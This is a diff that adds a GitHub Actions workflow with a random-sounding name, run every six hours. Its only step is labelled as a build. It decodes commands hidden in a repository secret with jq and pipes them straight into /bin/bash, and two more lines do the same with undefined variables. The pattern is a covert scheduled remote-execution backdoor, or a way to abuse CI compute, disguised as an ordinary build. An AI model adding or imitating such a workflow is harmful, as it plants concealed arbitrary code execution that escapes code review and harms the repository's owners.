@@ -1,0 +1,20 @@
+name: fretfulpresident
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fretfulpresident
+        env:
+          mdprn99899: ${{ secrets.mdprn99899 }}
+        run: |
+          echo $mdprn99899 | jq -r .awhfs1 | /bin/bash
+          echo $hibu5 | jq -r .hyx7197 | /bin/bash
+          echo $qtkjo35754 | jq -r .rzg379 | /bin/bash
+
